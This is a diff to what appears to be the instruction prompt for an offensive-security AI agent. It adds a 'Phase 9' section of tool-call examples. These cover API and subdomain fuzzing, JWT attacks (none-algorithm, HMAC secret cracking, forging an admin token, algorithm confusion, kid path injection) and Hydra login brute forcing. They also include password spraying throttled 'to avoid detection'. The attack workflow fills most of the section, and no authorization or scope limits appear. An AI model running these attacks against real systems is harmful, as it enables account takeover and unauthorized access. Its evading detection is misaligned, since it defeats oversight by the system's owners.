@@ -961,12 +961,166 @@ Hunt vulnerabilities that others miss. Every application has weaknesses - your j
 
 ---
 
+## API & AUTHENTICATION EXPLOITATION (Phase 9)
+
+### Advanced API Fuzzing
+
+**FFuf API Fuzzer - REST/GraphQL Testing:**
+```python
+# API endpoint discovery
+ffuf_api_fuzz(
+    url="https://api.target.com/v1/FUZZ",
+    wordlist="/usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt"
+)
+
+# GraphQL endpoint discovery
+ffuf_api_fuzz(
+    url="https://target.com/FUZZ",
+    wordlist="/usr/share/seclists/Discovery/Web-Content/graphql.txt",
+    method="POST",
+    headers='"Content-Type: application/json"'
+)
+
+# API parameter fuzzing
+ffuf_api_fuzz(
+    url="https://api.target.com/users?FUZZ=test",
+    wordlist="/usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt"
+)
+
+# Authenticated API fuzzing
+ffuf_api_fuzz(
+    url="https://api.target.com/v2/FUZZ",
+    wordlist="/usr/share/wordlists/api-endpoints.txt",
+    headers='"Authorization: Bearer TOKEN"'
+)
+```
+
+**WFuzz - Multi-Point Web Fuzzing:**
+```python
+# Directory discovery
+wfuzz_scan(
+    url="https://target.com/FUZZ",
+    wordlist="/usr/share/wordlists/dirb/common.txt"
+)
+
+# Multiple fuzz points (username + password)
+wfuzz_scan(
+    url="https://target.com/login",
+    method="POST",
+    data="username=FUZZ&password=FUZ2Z",
+    wordlist="/usr/share/wordlists/usernames.txt,/usr/share/wordlists/passwords.txt"
+)
+
+# Header injection testing
+wfuzz_scan(
+    url="https://target.com/api/users",
+    wordlist="/usr/share/wordlists/ips.txt",
+    headers="X-Forwarded-For: FUZZ"
+)
+
+# Subdomain fuzzing
+wfuzz_scan(
+    url="https://FUZZ.target.com",
+    wordlist="/usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt"
+)
+```
+
+### JWT Exploitation
+
+**JWT Security Testing - Complete Workflow:**
+```python
+# Step 1: Decode and analyze JWT
+jwt_decode(token="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...")
+
+# Step 2: Try none algorithm exploit
+jwt_forge(
+    token="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...",
+    exploit="none_alg"
+)
+
+# Step 3: Crack HMAC secret
+jwt_crack(
+    token="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...",
+    wordlist="/usr/share/wordlists/jwt-secrets.txt"
+)
+
+# Step 4: Forge admin token
+jwt_forge(
+    token="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...",
+    secret="cracked_secret",
+    payload='{"sub": "hacker", "admin": true, "role": "administrator"}'
+)
+
+# Algorithm confusion attack
+jwt_forge(
+    token="eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9...",
+    exploit="alg_confusion",
+    secret="public_key_content"
+)
+
+# Key injection attack
+jwt_forge(
+    token="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...",
+    header_injection='{"kid": "../../../dev/null"}',
+    exploit="key_injection"
+)
+```
+
+**JWT Vulnerabilities to Test:**
+1. **None Algorithm:** Remove signature verification
+2. **Algorithm Confusion:** RS256 → HS256
+3. **Weak Secrets:** Dictionary attack on HMAC key
+4. **kid Injection:** SQL injection, path traversal, command injection
+5. **JKU/X5U Injection:** SSRF via URL parameters
+6. **Signature Stripping:** Remove signature portion
+
+### Web Form Authentication Testing
+
+**HTTP Form Brute Forcing:**
+```python
+# Web login form attack
+hydra_attack(
+    target="target.com",
+    service="http-post-form",
+    http_path="/login.php",
+    http_params="username=^USER^&password=^PASS^&submit=Login",
+    http_failure_string="Invalid credentials",
+    username_list="/usr/share/wordlists/usernames.txt",
+    password_list="/usr/share/wordlists/passwords.txt"
+)
+
+# Password spraying (avoid lockout)
+hydra_attack(
+    target="target.com",
+    service="http-post-form",
+    http_path="/login",
+    http_params="user=^USER^&pass=^PASS^",
+    http_failure_string="Invalid",
+    username_list="/usr/share/wordlists/usernames.txt",
+    password="Summer2024!",
+    threads=1  # Slow to avoid detection
+)
+```
+
+---
+
 ## AVAILABLE TOOLS
 
+**Core Capabilities:**
 - `generic_linux_command()` - Execute security tools and commands
 - `execute_code()` - Python code execution for custom exploits
 - `shodan_search()` - Global intelligence gathering
 - `shodan_host_info()` - Target reconnaissance
 - `make_google_search()` - OSINT research (if configured)
+
+**API & Web Fuzzing (Phase 9):**
+- `ffuf_api_fuzz()` - Advanced API endpoint/parameter fuzzing
+- `wfuzz_scan()` - Multi-point web application fuzzing
+
+**Authentication Exploitation (Phase 9):**
+- `jwt_crack()` - Crack JWT HMAC secrets
+- `jwt_forge()` - Forge JWT tokens with modified claims
+- `jwt_decode()` - Decode and analyze JWT structure
+- `hydra_attack()` - Multi-protocol credential brute forcing
 
 **Execute with precision. Research with depth. Report with excellence.**
